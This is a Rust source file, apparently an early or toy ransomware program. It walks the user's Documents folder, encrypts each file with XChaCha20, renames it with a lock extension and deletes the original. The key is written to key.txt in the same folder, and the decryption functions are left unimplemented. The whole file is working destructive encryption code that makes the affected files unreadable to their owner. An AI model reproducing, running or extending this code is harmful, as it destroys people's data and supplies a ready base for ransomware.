use std::io::Write;
use std::{fs, path::Path};
use std::path::PathBuf;
use orion::aead::{self, SecretKey};
use dirs::document_dir;
use walkdir::WalkDir;
use text_io::read;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const KEY_FILE_NAME:		&str	= "key.txt";

type IDFC<T>		= Result<T, Box<dyn std::error::Error>>;

fn main() -> IDFC<()> {
	let target_dir = document_dir().unwrap();
	let mut keyfile_loc = target_dir.clone();
	keyfile_loc.push(KEY_FILE_NAME);
	let keyfile_loc = keyfile_loc; // make immutable
	let canonical_keyfile_path = keyfile_loc.canonicalize()?;

	let mode_choice: String = read!();
	let encrypting = mode_choice.starts_with(|v: char|
		v.to_lowercase().to_string() == "y"
	);
	
	let entries = WalkDir::new(target_dir);

	if encrypting {
		let key = SecretKey::default();
		append_file(keyfile_loc, key.unprotected_as_bytes())?;

		// encrypt shit :P
		for entry in entries {
			let entry = entry?;
			let path = entry.path();
	
			if	path.is_file() &&
				path.canonicalize()? != canonical_keyfile_path {
					
				encrypt_file(path, &key)?;
			}
		}
	} else {
		todo!()
		//let key = read_keyfile()?;
		//let key_bytes = k.unprotected_as_bytes();

		//decrypt_file(path, keyfile_loc.as_path())?;
	};

	Ok(())
}

fn encrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	// Don't encrypt already encrypted files
	if file_name.ends_with(ENCRYPTED_EXTENSION) {
		return Ok(())
	}

	let encrypted_path = PathBuf::from(
		format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
	);

	// Prepare new file data
	let content = fs::read(&path)?;
	let ciphertext = encrypt_xchacha20(&content[..], &key)?;

	// Write encrypted data to new file
	fs::write(&encrypted_path, &ciphertext[..])?;

	// rm old file
	fs::remove_file(&path)?;

	Ok(())
}

fn decrypt_file(path: &Path, keyfile_loc: &Path) -> IDFC<()> {
	todo!()
}

fn encrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
	let ciphertext = aead::seal(&key, src)?;
	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;

	Ok(ciphertext)
}

fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> IDFC<()> {
	fs::write(&path, &[])?;

	let mut file = fs::OpenOptions::new()
		.append(true)
		.create(true)
		.open(&path)?;

	file.write(data)?;

	Ok(())
}

fn read_keyfile() -> IDFC<SecretKey> {
	todo!()
}
